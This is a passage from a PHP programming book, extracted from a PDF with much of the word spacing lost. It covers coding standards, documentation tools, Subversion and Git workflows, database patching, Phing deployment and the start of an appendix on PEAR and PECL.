inthesame way thatourdetailed report was, orthey canbeproduced inother
formats. Togenerate asummary report, wecansimply do:
phpcs --standard=PEAR --report=summary *
------------------------------------------------------------------ 
PHP CODE SNIFFER REPORT SUMMARY
------------------------------------------------------------------
FILE                                           ERRORS  WARNINGS
------------------------------------------------------------------
...e/eventscontroller.php  93      10
...e/rest/index.php        29      3
...e/rest/request.php              4       0
------------------------------------------------------------------
A TOTAL OF 126 ERROR(S) AND 13 WARNING(S) WERE FOUND IN 3 FILE(S)
This data from asmall sample project (actually ,theRESTful service wesawin
Chapter 3)gives youanidea ofhow thiswould look. Wecanseehow many errors
andwarnings have been discovered ineach file,with afinal total atthebottom.
This report isavailable inafewformats, including CSV.
One very common format istheoneused byCheckstyle,2aJava code format-
checking tool. PHP Code Sniffer cangenerate XML inthesame format Checkstyle
does, sothatanything thatcanread thisformat candisplay ourdata. Commonly ,
thisisused with acontinuous integration environment thatwill generate thisdata
onaregular basis, andpresent itinaweb-based format; itwillalsograph how many
errors andwarnings were found each time, along with which violations were fixed
andwhich were introduced.
PHP Code Sniffer Standar ds
There areseveral standards thatship bydefault with PHP Code Sniffer ,andyou
cancreate orinstall anyofyour own. Toseewhich standards youhave available,
runphpcs with the-iswitch:
2http://checkstyle.sourceforge.net/293 Quality Assur ance
www.it-ebooks.info
phpcs -i
The installed coding standards are MySource, PEAR, Squiz, PHPCS ➥
  and Zend
Ingeneral, thePEAR standards arefairly widely accepted andareuseful formost
teams. TheZend standards arenotthecurrent standard forZend Framework (in
fact, Zend Framework uses anadapted version ofthePEAR standards). Squiz3is
rather anice standard, butitisvery fussy about blank lines, forexample, which
canmake itdifficult touseforaneveryday standard.
Thekeytoaneffective useofstandards istopick astandard—any standard. Then
implement it,andstop talking about coding standards, because allthatmatters is
thatthere isastandard! Theargument about opening braces being onanew lineor
onthesame lineisasoldastheoneabout VimvsEmacs inthetexteditor wars,
andneither will ever bewon.
Youmight find, though, thatyoudoneed toadapt, orrelax, oneofthestandards
tomake ituseful foryour particular application. Forexample, anopen source project,
which isbuilt bymany hands, might abolish therequirement foran@author com-
ment because itwill never beaccurate. Itisrelatively simple tocreate your own
standard, particularly ifyouareonly combining existing rules intoanew standard.
PHP Code Sniffer standards consist ofaseries ofsniffs ,each oneperforming one
small task, such aschecking foraspace between anif() statement anditsrelated
parentheses. Youcaneasily recombine existing sniffs tocreate astandard thatworks
foryour particular setting.
Documentation and Code
Most developers find writing documentation abitofadrag. One tactic formaking
thedocumentation ofthesystem internals easier istowrite documentation inline
with your code, intheform ofcomments. This means thatwhile looking atthecode,
we’re seeing thedocumentation.
Every function andclass should have acomment. When wechange code inany
way,wecanaddthedocumentation atthesame time, inthesame file.Thecoding
3http://www .squizlabs.com/php-codesnifferPHP Master: W rite Cutting-edge Code 294
www.it-ebooks.info
standards checks willhighlight where anycomments aremissing, making itharder
fordevelopers toforget towrite documentation.
Thecomments follow avery strict pattern (aswesawinthesection called “Checking
Coding Standards with PHP Code Sniffer” ),sothatthey canbeparsed into mean-
ingful documentation. Here isanexample ofasingle fully documented class:
/**
 * Robot class code
 *
 * PHP Version 5
 * 
 * @category  Example
 * @package   Example
 * @author    Lorna Mitchell <lorna@lornajane.net> 
 * @copyright 2011 Sitepoint.com
 * @license   PHP Version 3.0 {@link http://www.php.net/license/ ➥
                3_0.txt}
 * @link      http://sitepoint.com
 */
/**
 * Robot 
 * 
 * PHP Version 5
 * 
 * @category  Example
 * @package   Example
 * @author    Lorna Mitchell <lorna@lornajane.net> 
 * @copyright 2011 Sitepoint.com
 * @license   PHP Version 3.0 {@link http://www.php.net/license/ ➥
                3_0.txt}
 * @link      http://sitepoint.com
 */
class Robot
{
    protected $x = 0;
    protected $y = 0;
    /**
     * Retrieve this character's usual comment
     * 
     * @return string The comment
     */295 Quality Assur ance
www.it-ebooks.info
    public function getCatchPhrase() 
    {
        return 'Here I am, brain the size of ...';
    }
    /**
     * Move the character by a random amount
     * 
     * @return boolean true
     */
    public function dance() 
    {
        $xmove = rand(-2, 2);
        $ymove = rand(-2, 2);
        if ($xmove != 0) {
            $this->x += $xmove;
        }
        if ($ymove != 0) {
            $this->y += $ymove;
        }
        return true;
    }
}
Most IDEs willgenerate skeleton documentation from class andmethod declarations,
naming theparameters, andsoon.Then wecanjustaddinthemissing information
about what each variable should look like, what type itshould be,andwhat it’sfor.
Using tools tohelp youalong makes thisprocess quite painless—so there areno
excuses fornothaving documentation!
Using phpDocumentor
There areanumber oftools available forturning these comments into documents.
Themost established isphpDocumentor ,4which youcaninstall from PEAR (check
Appendix Aformore information about how todothis). Togenerate thedocument-
ation forour(admittedly very basic) project, weinstall phpDocumentor andthen
type:
phpdoc -t docs  -o HTML:Smarty:PHP -d .
4http://www .phpdoc.org/PHP Master: W rite Cutting-edge Code 296
www.it-ebooks.info
Thephpdoc isthename oftheprogram, andwe’re adding afewswitches. The-t
switch setsthedestination directory forthefinished output, the-ospecifies which
template tobase thedocumentation on,andthe-dindicates where thecode to
document isfound—in thiscase, thecurrent directory .Once thiscompletes, we
canopen docs/index.html with ourbrowser andseeFigure 8.1.
Figur e 8.1. W eb documentation gener ated by phpDocumentor
This presents theinformation from ourcode fileandallows ustoview itinafew
different ways. Wecanview theinformation byfile,asFigure 8.2shows.
Figur e 8.2. File view fr om phpDocumentor , showing what is in this file
Orwecanview theinformation byclass, asinFigure 8.3.297 Quality Assur ance
www.it-ebooks.info
Figur e 8.3. Showing the methods fr om the Robot  class
While these examples arealittle sparse, ifyouwere torunthistoolover amore
substantial application, youwould very quickly seethedetail emerging. One im-
portant point tonote isthateven without thecode comments ,phpDocumentor will
generate information about classes, method names, andsoon.This means thatyou
canintroduce thetoolaspart ofyour build process, andhave aweb-viewable set
ofAPIdocuments very quickly—then addinthecomments toimprove thisdocu-
mentation asyougoalong.
This tiesinvery nicely with thePHP Code Sniffer tool, which canwarn about
missing comments. Initially thiswill return alarge number ,buthaving away of
viewing themetrics isagreat motivator forateam.
Other Documentation T ools
While phpDocumentor hasbeen astandard formany years, itisyettoevolve to
take account ofthechanges introduced inPHP 5.3orlater.Asaresult, ahandful
ofnew tools have sprung uptofillthegap—however ,none areyetmature enough
tobeconsidered asareplacement standard. There arepromising evolutions ina
fewprojects, including DocBlox5andthenewest versions ofDoxygen,6sodotake
thetime tolook around fortools thatwill suityour particular needs.
5http://www .docblox-project.org/
6http://www .stack.nl/~dimitri/doxygen/index.htmlPHP Master: W rite Cutting-edge Code 298
www.it-ebooks.info
Source Contr ol
We’dhope thatevery project isalready using some form ofsource control. However ,
ifthat’snotthecase, orifyou’re new totheindustry ,thissection starts atthevery
beginning. We’lldiscuss why source control isworth thehassle, which tools are
available, andhow tosetupandstructure arepository inamanner thatsuits your
particular process. Although thegeneral concepts arecovered andapply toawide
range oftools, we’ll useSubversion7andGit8toillustrate theexamples shown.
Keeping control ofyour code andother assets iskeytoasuccessful andefficient
project, andthissection gives youallyouneed toachieve this.
Source control ismore than justachange history ofcode, although having thehistory
isreally useful forthose moments where yourealize you’ve gone offonatangent,
orwhere theclient decides they liked theprevious version better .Foreach change
thatwasmade, there isinformation about:
■who made thechange
■when ithappened
■what changed exactly
■why thiswasdone9
Even foraone-person project, with nocollaboration orbranching, it’sstillauseful
feature. Keeping code inarepository alsodefines acentral storage facility forcode.
Youcankeep code there, pull itonto different machines, back itup,useitasthe
basis foradeployment mechanism (more onthatlater inthischapter), andknow
thatyou’re always working with thecorrect version ofthecode.
Source control isalso akeycollaboration tool. It’sdesigned tomake themerging of
multiple setsofchanges painless, andremoves theneed forstrategies such asasking
around theoffice toseewho made changes recently ,orrenaming directories with
people’ sinitials sothatnobody elsemakes changes atthesame time!
7http://subversion.apache.org/
8http://git-scm.com/
9Unless youallow commit messages such as“fixed,” which isbarely helpful.299 Quality Assur ance
www.it-ebooks.info
Working with Centr alized V ersion Contr ol
Already we’re seeing some quite specific words being used, solet’sdoaquick
vocabulary listtodecode these:
repository home ofthecode
commit torecord thestate ofchanges
check out totake code from therepository towork on
working copy thecode checked outfrom therepository
Wecanhave many people checking outthesame code from thesame repository at
thesame time. Each person makes changes, andcommits them back totherepository .
Everyone elseupdates toreceive those changes, andhave them added intotheir
current working copies. Thesetup isrepresented byFigure 8.4.
Figur e 8.4. W orking copies checked out fr om a centr al repository
Sometimes itcanbedifficult towork effectively with source control, especially
without alotofexisting source control knowledge intheteam. Thesystem canseem
togetintheway,which isnotwhat wewant from anytool. However ,there are
some simple steps thatcanreally make lifeeasier—here areafewthathave been
learned byexperience:
■update before youcommit
■have astandard convention forthenaming ofprojects/branches
■commit often (daily asaminimum); therefore, update often
■keep talking about who isworking onwhat (toavoid duplication andconflicts)
Allofthisisvery well intheory ,butthenext section shows how thisworks in
practice using Subversion. Information onGitanddistributed systems iscovered
later inthechapter .PHP Master: W rite Cutting-edge Code 300
www.it-ebooks.info
Using Subversion for Sour ce Contr ol
Subversion isthestandard choice formost source control systems inorganizations.
There isamove towards distributed systems, butthere’ sstillaplace forasimple,
centralized source control tool, especially inteams where there arejunior developers
ordesigners working with thistool, andmost people areinoneorafewlocations.
Fornow atleast, Subversion isalive andwell, andtheSubversion project isalive,
well, andcommitted tobeing anexcellent centralized solution.
Let’srunthrough thecommands you’re most likely toneed. First ofall,here’ show
tocheck outcode, receive new changes, andcommit your own changes:
$ svn checkout svn://repo/project
A    project/hello.php
Checked out revision 695.
$ svn update
A    project/readme
At revision 697.
$ vim hello.php
$ svn status
M       hello.php 
$ svn commit -m "Fixed bug #42 by changing the wording"
Sending        hello.php 
Transmitting file data . 
Committed revision 698. 
First, wechecked outourcode toalocal working copy .Ifyouneed tosetupany
web server configuration, such asvirtual hosts, you’d doitatthispoint. Thefollow-
ingtwosteps—updating andcommitting—happen again andagain asyouwork on
afeature, intermittently pulling inthechanges from others. Once youarefinished,
you’ll doonefinal update tomake sure you’re insync with thelocal repository ,
andthen commit your changes. Others will receive your changes when they doan
update.
This covers themost basic functions ofPHP,andletsyoushare code easily with a
potentially very large team, solong aseverything isgoing well. Unfortunately ,that’s
notalways thecase! Iftwopeople make achange tothesame part ofthesame file,301 Quality Assur ance
www.it-ebooks.info
Subversion will notbeable tomake thedecision about whose change should take
precedence, andwillaskyouforinput. Todothis, itwillmark thefileasaconflict .
Imagine ourfilehello.php contains thefollowing (very basic) code:
$greeting = "hello world";
echo $greeting;
Now let’slook atwhat happens when twodevelopers make changes thatconflict.
Both developers check outthecode attherevision shown above. Thefirstdeveloper
changes thegreeting tobemore informal:
$greeting = "hello friend";
echo $greeting;
Thechange iscommitted totherepository inthenormal way,butinthemeantime,
another developer hasalso made achange sothatitnow looks likethis:
$message = "hello world";
echo $message;
When thissecond developer tries tocommit thecode, thecommit willfailbecause
thefiles will beoutofdate. When both developers update, they will benotified of
aconflict, since thesame lineofcode ischanged inboth theincoming version and
inthelocal working copy .
Since Subversion 1.5,it’sbeen possible tointeractively resolve conflicts. When you
dothis, you’ll have theoption toeditthefileliterally inthemiddle ofthecheckout.
Youcanalso choose topostpone thechanges until later onandfinish updating.
Either way,thefilewith theconflicts will show notation likethis:
<<<<<<< .mine
$message = "hello world";
echo $message;
=======
$greeting = "hello friend";
echo $greeting;
>>>>>>> .r699PHP Master: W rite Cutting-edge Code 302
www.it-ebooks.info
Ifyourunsvn status atthispoint, you’ll seethatthehello.php fileshows aCnext
toit—this indicates itsconflicted state. There arealso three new files thatweren’t
there before: hello.php.mine ,hello.php.r698 ,and hello.php.r699 .These contain your
code before youransvn update ,therepository version ofthecode from thelast
time youupdated orchecked out,andthemost recent version from therepository .
Todeal with theconflicted fileorfiles, you’ll need tomanually editthefiletore-
move themarkup thathasbeen placed bySubversion, andsetthecode tothecorrect
version. Once youarehappy thatthecodebase isingood shape, letSubversion
know thatyou’ve dealt with thefiles bysending theresolved command:
svn resolved hello.php
This will remove theconflicted status mark anddelete theextra files thatwere
written. Theconflict must beresolved before anyfurther commits canbemade from
thisworking copy .
Conflicts and T eams
Itisinevitable thatconflicts will occasionally occur ,especially asSubversion is
unable toread PHP code, andthus can’t tellthatthe“conflicts” itcanseeonthe
endofalibrary fileareactually twonew functions being added bydifferent people.
However ,regular conflicts canbeasymptom ofpoor team communication orin-
frequent committing/updating. Ifyouseeconflicts onaregular basis, examine the
practices andprocesses ofyour team todecide onaway toavoid this.
Designing Repository Structur e
ASubversion repository canhold many projects, andwithin those projects itis
common tohave these directories: branches, tags, andtrunk.10Thetrunk holds the
main version ofthecode, butwhat about thetagsandbranches? Let’sdefine what
these are,andthen talkabout how tousethem.
Abranch isanother copy ofthecode. Webranch inorder toisolate asetofchanges
from themain trunk; forexample, while we’re working onamajor feature. Without
branching, thedeveloper working onthefeature would beunable tocollaborate
with others, andwouldn’t beable tocommit changes totherepository until they
10This isaconvention only—having branches andtagsisn’t mandatory .303 Quality Assur ance
www.it-ebooks.info
were certain thatthefeature wascomplete andwouldn’t break anyone else’scode.
Withabranch, youhave asafearea towork oncode, committing asoften asyou
need to,andcollaborating asappropriate.
Atagissimply ahuman-readable name representing aparticular point intime in
therepository .It’susual totagwhen youwant tolabel aparticular version; itmight
beaversion youreleased, forexample.
There areafewcommon approaches totheway thatbranches andtagsareused
within arepository ,andmost teams useoneofthese oravariation onthem. Let’s
compare them now.
Branch-per-version
This approach ismost common forshrink-wrapped orlibrary software. There isa
main trunk, butaseach major version isreleased, anew branch comes offit.Each
time aminor point release comes out,weaddatag.Soweendupwith asituation
such asinFigure 8.5.
Figur e 8.5. A r epository showing br anches and tags for a ver sion-based r elease str ategy
Inthismodel, werelease new versions from thebranches. New development happens
onthetrunk, followed byamajor version release, andminor enhancements and
bugfixes along theversion branch. Bugfixes may alsobemerged between branches,
ifmultiple versions ofthesoftware areinuseatonetime (more onmerging shortly).PHP Master: W rite Cutting-edge Code 304
www.it-ebooks.info
Branch-per-featur e
This ismuch more common forweb projects, simply because thecost ofshipping
new versions issolow(especially ifyouhave anautomated deployment strategy ,
which we’ll talkabout inthesection called “Automated Deployment” ).Withthis
approach, wecreate anew branch foreach new feature thatwebuild. Most teams
tolerate some form ofvery quick fixing directly onto thetrunk, butitisforeach
team todecide when that’sacceptable. Therepository ends upasrepresented in
Figure 8.6.
Figur e 8.6. A r epository with br anches for notable featur es
Foreach new feature thatisworked on—for example, allowing users tologinusing
Twitter—a new branch iscreated. Then thedevelopers working onthatfeature can305 Quality Assur ance
www.it-ebooks.info
collaborate asusual, until thefeature iscomplete. Itcanthen bemerged back into
thetrunk.
Distributed V ersion Contr ol
Increasingly ,we’re seeing themajority ofopen source projects—and also some
commercial ones—moving over touseoneofthedistributed version control systems.
There areafewdifferent tools inuse, butthemain ones are:
■Git
■Mercurial11(also known as“Hg,” thechemical symbol fortheelement mercury)
■Bazaar12(also known as“bzr”)
Allthese tools have broadly equivalent feature setsandwork onacommon setof
concepts, sowe’ll discuss them inhigh-level terms ofdistributed version control.
Thebigdifference with distributed systems isthatthere isnocentral point. There
aremany repositories inthesystem, andeach onecanexchange commits with one
another .Earlier wesawacentralized repository diagram inFigure 8.4.Withadis-
tributed system, wedon’t check outfrom thecentral repository; instead weclone
it,making anew repository ofourown. Instead ofworking copies, everyone hasa
repository ,andevery repository islinked toevery other repository .Thelayout ends
upasconceptualized inFigure 8.7.
11http://mercurial.selenic.com/
12http://bazaar .canonical.com/en/PHP Master: W rite Cutting-edge Code 306
www.it-ebooks.info
Figur e 8.7. The many r epositories of a typical distributed system
Users canpush changes from their repository toanother one, andpull changes in
from anyother repository .This means thatthere aremuch more flexible ways of
working than areavailable inthecentralized systems. Italso means thatthere is
more toknow ,soingeneral thelearning curve forworking with distributed systems
issteeper .It’susual tonominate onerepository asthemain one, although thisis
only aname andthechosen repository hasnospecial properties. Having amain
repository simply means thatthisrepository isbacked up,andisused forthebasis
ofdeployments.
When migrating from acentralized system, there areafewelements thatwork quite
differently inadistributed system. Thefirst isthateach commit isachangeset ,
rather than asnapshot. Arevision number refers toasetofchanges, likeapatch,
rather than afullexport ofthesystem. Another bigchange ishow branches work;
since your repository islocal, youcaneither branch onyour local repository ,or
mark itasabranch thatyou’ll share. This means thatyoucanbranch foryour own307 Quality Assur ance
www.it-ebooks.info
purposes, merge thechanges intoashared branch (orthrow them away), then push
thechanges outtoanother repository .
Social T ools for Coding
Itwould beimpossible tomention theriseofGit(and friends) without alsomention-
ingthesites thathave sprung uparound it,such asGitHub.13These sites offer
hosted source control systems, andtheability to“follow” another user andseetheir
activity ,ortheactivity onagiven project. They often offer wikis andissue trackers
aswell, sotaken altogether they provide themajority ofthetools we’d need torun
adevelopment project. Therealreason behind their rise, however ,isthatwhen we
work with adistributed system, it’svery useful tobeable tokeep track ofwho else
hascopies ofthisrepository andwhat changes they aremaking. Thesocial sites
alsoallow people tosend uspullrequests —messages asking ustobring their changes
into ourmain branch. Inaddition, many ofthese sites offer aweb interface forper-
forming amerge likethis.
There aresites available forallkinds ofsource control systems, including Subversion,
thathave these features. They areexcellent foraproject team touse, andmost of
them offer freeaccounts foropen source software, orpaid-for ones more appropriate
forusebyacommercial enterprise.
Using Git for Sour ce Contr ol
Earlier ,wesawsome simple examples onhow towork with Subversion, sointhis
section we’ll take amoment tocompare itwith adistributed system such asGit.
Some ofthewording differs between thetwoapproaches. Withadistributed system,
weclone arepository rather than checking outfrom one. Using atoollikeGitHub,
youmight firstforktherepository tocreate aversion thatyouown, which ispublicly
available, andwhich youcanwrite to—then clone thattoyour local machine so
thatyoucanwork onit.
Toclone arepository ,weusetheclone command. Here’ sanexample ofcloning a
GitHub repository fortheJoind.in open source project:
$ git clone git@github.com:lornajane/joind.in.git
Cloning into joind.in...
13http://github.com/PHP Master: W rite Cutting-edge Code 308
www.it-ebooks.info
This willcreate alocal directory with thesame name astheremote repository .When
wechange into it,ourcode will bethere, exactly asweexpect. Inorder topull in
changes from theother repositories, wefirst need totalkabout remotes .Intheex-
ample ofcloning aGitHub repository ,we’ll want topull changes from themain
Joind.in project onGitHub, where itwasforked from. Todothis, we’ll need toadd
itasaremote, andthen pull inthechanges:
$ git remote add upstream git@github.com:joindin/joind.in.git
$ git remote
origin
upstream
We’ve added themain Joind.in project repository asaremote calledupstream ,
which isaconvention, butquite auseful one. When wetypegit remote with no
arguments, wegetalistoftheremotes thatGitknows about, including ourupstream
remote andorigin —the remote thatwecloned itfrom. Wecangetchanges from
theupstream repository byusing thepull command, likethis:
$ git pull origin master
Thetwoarguments aretheremote name andthebranch name thatwewant topull
changes from. Wecanmake ourown changes byediting files asweusually would;
however ,specifically inGit,weneed toaddthechanged files inorder tohave them
included inourcommit. Weusegit status toshow uswhat hasbeen changed,
which files arenottracked, andwhich have been added toinclude inthenext
commit:
$ git status 
# On branch master
# Changes not staged for commit:
#   (use "git add <file>..." to update what will be committed)
#   (use "git checkout -- <file>..." to discard changes in ➥
       working directory)
#
#       modified:   index.php
#
no changes added to commit (use "git add" and/or "git commit -a")
$ git add index.php
$ git status309 Quality Assur ance
www.it-ebooks.info
# On branch master
# Changes to be committed:
#   (use "git reset HEAD <file>..." to unstage)
#
#       modified:   index.php
#
$ git commit -m "added comments to index.php"
Here weusegit status toshow uswhat hasbeen changed, andthen again tosee
what we’ve added. Once we’ve committed thefile,wecanseeourchanges reflected
intheoutput ofgit log —but thechanges stillexist only inourlocal repository .
Inorder toputthese changes into theremote repository ,inthiscase theGitHub
repository ,weneed topush them there, bytypinggit push .Bydefault, thispushes
thechanges inyour local repository totheoneitwascloned from.
The Repository as the Root of the Build Pr ocess
Many oftheother tools covered inthischapter ,aswell asthetesting tools, arere-
commended toberunautomatically .Some ofthem youmight want toruninre-
sponse toanew commit (such astests andcoding standard checks). You’ll also
want tohave some form ofautomated deployment system, which we’ll talkabout
inthenext section. Forallofthese, having your code insource control enables the
tools toknow where togetthecode from, andhow toshow youwhat haschanged
inthisversion.
Automated Deployment
How doyougetyour code onto aliveplatform? Many people will answer with
stories about using FTP totransfer changed files, orrunning SVN upontheproduc-
tion platform topull inthenew files. Both ofthese have theinherent downside of
giving some inconsistent results while thechange istaking place, andoffering no
means ofrollback.
Avoid Sour ce Contr ol Artifacts on Live Platforms
Beextremely cautious when checking outofasource control system onto alive
platform. These systems work onthebasis ofchange information stored locally ,
soifyour web server wastoserve these publicly ,youmight beexposing morePHP Master: W rite Cutting-edge Code 310
www.it-ebooks.info
information about your source code than youintended to.Forexample, ifyou’re
using Subversion, addarule toyour virtual host or.htaccess filetobanserving
anything with .svninthepath.
Instantly Switching to a New V ersion
Amore robust approach todeployment istosetupyour host sothatitpoints toa
symlink14—asymbolic link toatarget—rather than anormal directory .Then put
thecode onto theserver ,andpoint thesymlink atthatdirectory .When you’re ready
todeploy anew version, transfer thenew code onto theserver ,andgetitready .If
youneed toalsocopy orlinktoconfiguration files, orupload files, oranything else,
youcandothatnow.When you’re completely ready togo,youcansimply switch
thesymlink over topoint tothenew code, with nodowntime.
Using thisapproach also means thatyoucanrollback your changes, whereas with
thetactic ofswitching asymlink, ifthings goreally ,really wrong, youcanalways
goback totheoriginal version—which canbevery handy inanemergency!
Managing Database Changes
This isareally tricky subject and, asmuch aswewish wecould present agreat
solution foryou, there actually isn’t onethatcovers every usecase. Most ofthe
solutions arevariations onatheme ofwriting numbered database patches, keeping
arecord ofwhat number you’re upto,andthen collating thetwowhen youupdate
versions.
Abasic example ofthiswould betobegin with asimple database structure and
seed data, such asthis:
-- init.sql
CREATE TABLE categories
(id int PRIMARY KEY auto_increment,
name VARCHAR(255));
-- seed.sql
INSERT INTO categories (name) values ('Kids');
INSERT INTO categories (name) values ('Cars');
INSERT INTO categories (name) values ('Gardening');
14http://php.net/manual/en/function.symlink.php311 Quality Assur ance
www.it-ebooks.info
Then, ifwewant tochange ourdatabase schema, wefirst need tocreate away of
managing thisdata. This example adds thepatch control elements asapatch inits
own right, which means youcanpick upandusethisapproach onanexisting
database ifyouwant tostart managing changes toitinamore formal way.Sofirst
weaddthepatching, inafilecalled patch00.sql :
CREATE TABLE patch_history (
patch_history_id int primary key auto_increment, 
patch_number int, date_patched timestamp); 
INSERT INTO patch_history SET patch_number = 0;
Let’salso create thefirst realpatch, toillustrate what we’ll usethepatch_histor y
table for(this will bepatch01.sql ):
ALTER TABLE categories ADD COLUMN description varchar(255);
INSERT INTO patch_history SET patch_number = 1;
Wecreated thepatch_histor ytable, which shows which patches were runandwhen.
This gives more fine-grained information than juststoring thecurrent patch level,
which isuseful if,forexample, aparticular patch failed butwedon’t realize itim-
mediately .Byplacing thestatements andinserting thepatch history records asthe
lastitems inthepatch files, weknow these will only runiftheother statement(s)
completed successfully .
Theexample shown performs anALTER TABLE statement onthetable. Byplacing
SQL into patch files andrunning these against your own development database,
youensure thatyouhave arecord ofallchanges you’ve made. This isvital sothat
wecanreplicate them onother platforms—development platforms aswell aslive
platforms.
One aspect you’ll want toconsider about database change management issupport
forrollback —being able toundo changes automatically ,aswell asperform them
automatically .Insimple terms, wecandeal with thisbywriting twoSQL statements
foreach change—one toimplement thechange, andanother toremove itagain. For
some changes, however ,thisisn’t possible. What ifyour statement haddropped a
column? We’reunable torollback destructive changes ofthattype.PHP Master: W rite Cutting-edge Code 312
www.it-ebooks.info
There aremany tools thatcanhelp youtomanage database changes; some frame-
works have their own, andmany deployment tools also have anapproach tothis.
Whichever youchoose, thesystem isonly asgood astheinformation itisgiven—it
relies entirely onhaving afullandcorrect setofdatabase patches, with appropriate
patching history entries.
Automated Deployment and Phing
Throughout thissection, we’ve been alluding totheidea ofautomating deployments,
solet’sdive into thedetail now.Automated deployments need time andthought
tosetup,butthen they save youtime andmistakes every single instance youdeploy
your code after that. Think about these points:
■How long does ittake todeploy thecodebase?
■How often dowemake mistakes doing this?
■How frequently dowedeploy thiscode?
■How regularly would wedeploy ifitwere quick andpainless todoso?
Most project teams underestimate how long ittakes them todeploy code (forfun,
estimate foryour own systems andthen time yourselves thenext time youdoit!),
aswell asthecost ofthemistakes thatcanarise inanyprocess where more than
onething needs tohappen intheright order .Having atried andtested deployment
process inplace removes abigriskinyour project and, more importantly ,inits
maintenance phase, which often hasalimited budget.
Initssimplest form, anautomated deployment system consists ofaseries ofscripts
thatperform thebasic tasks. Atypical script might include thefollowing steps:
1.Tagandexport code from version control
2.Compress code into tarfile,transfer toserver ,anduncompress
3.Apply anydatabase patches asneeded
4.Create links toelements thatarepart oftheproject butreside outside ofthe
document root, such asupload directories, configuration files, andsoon
5.Switch thesymlink thatthedocument root points toover tothenew codebase
6.Empty caches andrestart jobservers313 Quality Assur ance
www.it-ebooks.info
7.Gotothebarandgrab abeer
There areplenty ofways youcanachieve this, from hand-spun shell scripts through
toproprietary ,paid-for solutions. Asanexample, we’ll take alook atPhing,15atool
written inPHP andintended forusewith PHP projects. Ithaslotsofplugins to
make common tasks painless, andalso hasitsown database management tool, db-
deploy .
Phing uses XML-based configuration, stored bydefault inafilecalled build.xml .We
give thename oftheproject, anddefine aseries oftasks thatbelong tothisproject.
Wecanalso indicate which ofthese should berunbydefault. Here’ sanexample
ofasimple configuration fileforPhing (taken from Phing’ sdocumentation):
<?xml version="1.0" encoding="UTF-8"?>
<project name="FooBar" default="dist">
    <target name="prepare">
        <echo msg="Making directory ./build" />
        <mkdir dir="./build" />
    </target>
    <target name="build" depends="prepare">
        <echo msg="Copying files to build directory..." />
        <echo msg="Copying ./about.php to ./build directory..." />
        <copy file="./about.php" tofile="./build/about.php" />
        <echo msg="Copying ./contact.php to ./build directory..." />
        <copy file="./contact.php" tofile="./build/contact.php" />
    </target>
    <target name="dist" depends="build">
        <echo msg="Creating archive..." />
        <tar destfile="./build/build.tar.gz" compression="gzip">
            <fileset dir="./build">
                <include name="*" />
            </fileset>
        </tar>
15http://phing.info/PHP Master: W rite Cutting-edge Code 314
www.it-ebooks.info
        <echo msg="Files copied and compressed in build directory ➥
           OK!" />
    </target>
</project>
Even inanXML format, thisconfiguration isrelatively easy tofollow .Wecreate
theproject tag,andsetthedefault target there. Then wedefine thetargets forthis
project:prepare ,build ,anddist .Thedefault target isdist ,andifatarget depends
onother targets, those will berunfirst.
Storing Deployment Scripts in the Codebase
Each project will need itsown build.xml file,although ifyou’re building similar
sites, youwill probably start from thesame skeleton foreach. It’sgood practice
tobring thedeployment configuration intothecodebase, since itdefinitely forms
part oftheproject. Alongside items such asthedatabase patches, these elements
belong intheproject, butoutside ofthedocument root.
TousePhing, weissue thecommand phing .Withnoarguments, thisruns thedefault
target; alternatively ,wecanspecify which target wewant torun:
phing prepare
This would simply create thebuild directory ,asseen inthetarget previously .
There areagreat number ofready-made tasks forPhing, where wecanjustconfigure
thesettings specifically forourserver .Itknows how torununit testsuites, check
coding standards, andusemost oftheother static analysis tools. Wecanalso use
itsexec tagtorunanycommand linestatement thatwewish. This makes itinfinitely
adaptable totheneeds ofourspecific deployment process.
Ready to Deploy
Inthisfinal chapter ,wecovered tools from source control tocoding standards,
through automating deployment andtouching ontheidea ofcontinuous integration
andabuild server .Every team willmixindifferent ingredients toachieve theright
blend fortheir particular projects, environment, andtheindividuals involved.315 Quality Assur ance
www.it-ebooks.info
Theabove tools andtechniques areuseful inthemajority ofprojects, anditcanbe
difficult toimplement alotofchanges allatonce. What wesuggest istolook back
through thechapter andpick anelement toimprove orintroduce first; then, infour
tosixmonths’ time, once thatelement isestablished, return andselect another ,and
repeat theprocess.PHP Master: W rite Cutting-edge Code 316
www.it-ebooks.info
Appendix A: PEAR and PECL
What is PEAR?
PEAR, thePHP Extension andApplication Repository ,isquite misnamed—it con-
tains neither extensions, norapplications! Itdoes, however ,contain many useful
PHP components (that is,components written inPHP). These canhelp youdo
anything from authentication tointernationalization tointeracting with webservices.
Thebiggest advantage thatPEAR brings tothetable isagreat installer forthese
component packages, andanyother packages created tothePEAR standard.
ThePEAR package manager ,found asthepear command onmost systems, isreally
where itstarts togetawesome.
Justlikeasystem package manager (think APT,YUM, orports), PEAR handles both
required andoptional dependencies. Itcanalsobeused tosearch forpackages, and
even create your own.
While thepear command canbeused tomanage PECL packages, there’ sadedicated
pecl command thatperforms thesame tasks forthePECL repository .
What is PECL?
PECL, thePHP Extension Community Library ,isasibling project ofPEAR; itprovides
PHP extensions (written inC)thatcandoanything from speeding upyour applica-
tions toworking with images. WithPHP extensions being written inC,youmust
have system access toinstall them; inshared hosting environments there’ srarely
theoption todothis.
Oh,andsome people pronounce it“Peckall,” while others say“Pickle.” Either way
works.
Installing P ackages
Theprocesses ofinstalling PEAR andPECL packages should bealmost identical—and
forthemost part, they are.There aresome extensions (such astheXHProf extension
www.it-ebooks.info
weused inthesection called “Profiling” inChapter 6)thatrequire youtocompile
them byhand.
Toinstall apackage forPEAR, youjustneed torun:
$ pear install <package>
This isthesimplest situation—if there isastable package with thatname, itwill
justinstall. Youcanspecify unstable packages simply byappending ittothefile
name:
$ pear install <package>-beta
Orforaparticular version:
$ pear install <package>-0.3.1
Asanexample, let’sinstall thePEAR_PackageFileManager2 package. This package
canbeused tocreate your own packages:
$ pear install PEAR_PackageFileManager2
Did not download optional dependencies: 
pear/PHP_CompatInfo, use --alldeps to download 
automatically
Failed to download pear/XML_Serializer within preferred 
state "stable", latest release is version 0.20.2, stability 
"beta", use "channel://pear.php.net/XML_Serializer-0.20.2" 
to install
pear/PEAR_PackageFileManager2 can optionally use package 
"pear/PHP_CompatInfo" (version >= 1.4.0)
pear/PEAR_PackageFileManager_Plugins requires package 
"pear/XML_Serializer" (version >= 0.19.0)
pear/PEAR_PackageFileManager2 requires package 
"pear/PEAR_PackageFileManager_Plugins"
No valid packages found
install failed
Well,thatdidn’t gosowell—but let’stake alook atwhat theinstaller istelling us.PHP Master: W rite Cutting-edge Code 318
www.it-ebooks.info
First, there aretworequired dependencies, PEAR_PackageFileManager_Plugins
